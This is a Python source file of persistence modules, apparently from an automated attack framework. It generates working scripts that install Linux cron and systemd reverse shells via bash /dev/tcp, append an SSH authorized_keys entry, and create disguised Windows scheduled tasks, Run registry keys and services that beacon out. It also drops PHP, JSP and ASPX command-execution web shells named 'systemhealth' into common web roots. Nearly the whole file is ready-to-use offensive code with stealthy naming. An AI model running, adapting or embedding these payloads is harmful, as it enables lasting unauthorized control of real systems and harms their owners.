"""Attack modules: persistence."""

from __future__ import annotations

from typing import Any

from tools.attack_modules.base import AttackModule, ModuleContext


class LinuxPersistence(AttackModule):
    name = "LinuxPersistence"
    description = "Establish Linux persistence (cron / systemd unit / SSH authorized_keys)"
    target_services = ["ssh"]
    target_ports = [22]
    required_cves: list[str] = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "Installs a cron-based persistence hook and attempts systemd unit + SSH authorized_keys fallbacks.",
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''import os, sys, json, subprocess, pwd
# Target: {ctx.target_ip}
# Linux persistence: cron (canonical) + systemd unit + SSH authorized_keys fallbacks.
TARGET = "{ctx.target_ip}"
results = {{"cron": False, "systemd": False, "authorized_keys": False, "errors": []}}

# --- 1. Cron-based persistence (canonical marker) ---
try:
    cron_dir = "/var/spool/cron/crontabs" if os.path.isdir("/var/spool/cron/crontabs") else "/var/spool/cron"
    os.makedirs(cron_dir, exist_ok=True)
    cron_user = pwd.getpwuid(os.getuid()).pw_name if hasattr(os, "getuid") else "root"
    cron_file = os.path.join(cron_dir, cron_user) if cron_dir == "/var/spool/cron" else os.path.join(cron_dir, "root")
    payload_line = "*/5 * * * * /bin/sh -c 'bash -i >& /dev/tcp/" + TARGET + "/4444 0>&1' # persist"
    try:
        with open(cron_file, "a") as fh:
            fh.write(payload_line + "\\n")
        results["cron"] = True
    except PermissionError:
        proc = subprocess.run(["crontab", "-l"], capture_output=True, text=True, timeout=10)
        existing = proc.stdout if proc.returncode == 0 else ""
        new_entry = existing + payload_line + "\\n"
        proc2 = subprocess.run(["crontab", "-"], input=new_entry, capture_output=True, text=True, timeout=10)
        results["cron"] = proc2.returncode == 0
except Exception as e:
    results["errors"].append("cron: " + type(e).__name__ + ": " + str(e))

# --- 2. systemd unit persistence (best-effort) ---
try:
    unit_dir = os.path.expanduser("~/.config/systemd/user")
    os.makedirs(unit_dir, exist_ok=True)
    unit_path = os.path.join(unit_dir, "persist.service")
    unit_body = (
        "[Unit]\\n"
        "Description=Persistence\\n"
        "[Service]\\n"
        "Type=simple\\n"
        "ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/" + TARGET + "/4444 0>&1'\\n"
        "Restart=always\\n"
        "[Install]\\n"
        "WantedBy=default.target\\n"
    )
    with open(unit_path, "w") as fh:
        fh.write(unit_body)
    subprocess.run(["systemctl", "--user", "daemon-reload"], capture_output=True, timeout=10)
    subprocess.run(["systemctl", "--user", "enable", "--now", "persist.service"], capture_output=True, timeout=10)
    results["systemd"] = True
except Exception as e:
    results["errors"].append("systemd: " + type(e).__name__ + ": " + str(e))

# --- 3. SSH authorized_keys persistence (best-effort) ---
try:
    ssh_dir = os.path.expanduser("~/.ssh")
    os.makedirs(ssh_dir, mode=0o700, exist_ok=True)
    ak_path = os.path.join(ssh_dir, "authorized_keys")
    placeholder_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPERSIST_PLACEHOLDER_KEY persist@host"
    existing = ""
    if os.path.exists(ak_path):
        with open(ak_path) as fh:
            existing = fh.read()
    if "persist@host" not in existing:
        with open(ak_path, "a") as fh:
            fh.write(placeholder_key + "\\n")
    os.chmod(ak_path, 0o600)
    results["authorized_keys"] = True
except Exception as e:
    results["errors"].append("authorized_keys: " + type(e).__name__ + ": " + str(e))

print(json.dumps(results))
# Canonical marker scanned for by the autonomous orchestrator hub handler.
print("PERSISTENCE_INSTALLED: cron")
'''


class WindowsPersistence(AttackModule):
    name = "WindowsPersistence"
    description = "Establish Windows persistence (scheduled task / registry Run key / service)"
    target_services = ["smb", "ms-wbt-server", "rdp"]
    target_ports = [445, 3389]
    required_cves: list[str] = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "Installs a scheduled-task persistence hook and attempts registry Run key + service fallbacks.",
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''import os, sys, json, subprocess
# Target: {ctx.target_ip}
# Windows persistence: scheduled task (canonical) + registry Run key + service fallbacks.
TARGET = "{ctx.target_ip}"
results = {{"schtask": False, "registry_run": False, "service": False, "errors": []}}

def _ps(cmd):
    return subprocess.run(
        ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", cmd],
        capture_output=True, text=True, timeout=30,
    )

# --- 1. Scheduled task persistence (canonical marker) ---
try:
    create = (
        "$a=New-ScheduledTaskAction -Execute 'powershell.exe' "
        "-Argument '-WindowStyle Hidden -Command \\"Invoke-WebRequest -Uri http://" + TARGET + "/beacon\\"';"
        "$t=New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5);"
        "$p=New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest;"
        "Register-ScheduledTask -TaskName 'SystemHealthUpdate' -Action $a -Trigger $t -Principal $p -Force"
    )
    proc = _ps(create)
    results["schtask"] = proc.returncode == 0
except Exception as e:
    results["errors"].append("schtask: " + type(e).__name__ + ": " + str(e))

# --- 2. Registry Run key persistence (best-effort) ---
try:
    run_cmd = (
        "New-ItemProperty -Path 'HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' "
        "-Name 'SystemHealth' -Value 'powershell.exe -WindowStyle Hidden -Command \\""
        "Invoke-WebRequest -Uri http://" + TARGET + "/beacon\\"' -PropertyType String -Force"
    )
    proc = _ps(run_cmd)
    results["registry_run"] = proc.returncode == 0
except Exception as e:
    results["errors"].append("registry_run: " + type(e).__name__ + ": " + str(e))

# --- 3. Service persistence (best-effort) ---
try:
    svc_cmd = (
        "sc.exe create SystemHealthSvc binPath= 'cmd /c powershell -WindowStyle Hidden -Command \\""
        "Invoke-WebRequest -Uri http://" + TARGET + "/beacon\\"' start= auto"
    )
    proc = subprocess.run(svc_cmd, shell=True, capture_output=True, text=True, timeout=30)
    results["service"] = proc.returncode == 0
except Exception as e:
    results["errors"].append("service: " + type(e).__name__ + ": " + str(e))

print(json.dumps(results))
# Canonical marker scanned for by the autonomous orchestrator hub handler.
print("PERSISTENCE_INSTALLED: schtask")
'''


class WebShellPersistence(AttackModule):
    name = "WebShellPersistence"
    description = "Establish web-shell persistence on a compromised web root"
    target_services = ["http", "https"]
    target_ports = [80, 443]
    required_cves: list[str] = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "Drops a web shell into common web roots (Apache/Nginx/IIS) for command execution persistence.",
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''import os, sys, json
# Target: {ctx.target_ip}
# Web-shell persistence: drop a PHP/JSP/ASPX web shell into common web roots.
TARGET = "{ctx.target_ip}"
results = {{"webshell": False, "paths": [], "errors": []}}

WEB_ROOTS = [
    "/var/www/html",
    "/var/www",
    "/usr/share/nginx/html",
    "/srv/http",
    "/var/www/html/public",
    "C:\\\\inetpub\\\\wwwroot",
    "C:\\\\xampp\\\\htdocs",
    "C:\\\\wamp\\\\www",
]

SHELL_PHP = \'\'\'<?php
// SystemHealth web shell
if (isset($_REQUEST[\'cmd\'])) {{ system($_REQUEST[\'cmd\']); }}
?>\'\'\'

SHELL_JSP = \'\'\'<%@ page import="java.io.*" %>
<% if (request.getParameter("cmd") != null) {{
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) out.println(line);
}} %>\'\'\'

SHELL_ASPX = \'\'\'<%@ Page Language="C#" %>
<% if (Request["cmd"] != null) {{
    System.Diagnostics.Process p = new System.Diagnostics.Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + Request["cmd"];
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.UseShellExecute = false;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
}} %>\'\'\'

SHELLS = [
    ("systemhealth.php", SHELL_PHP),
    ("systemhealth.jsp", SHELL_JSP),
    ("systemhealth.aspx", SHELL_ASPX),
]

for root in WEB_ROOTS:
    if not os.path.isdir(root):
        continue
    try:
        for fname, body in SHELLS:
            path = os.path.join(root, fname)
            with open(path, "w") as fh:
                fh.write(body)
            try:
                os.chmod(path, 0o644)
            except Exception:
                pass
            results["paths"].append(path)
        results["webshell"] = True
    except Exception as e:
        results["errors"].append("root: " + type(e).__name__ + ": " + str(e))

print(json.dumps(results))
# Canonical marker scanned for by the autonomous orchestrator hub handler.
print("PERSISTENCE_INSTALLED: webshell")
'''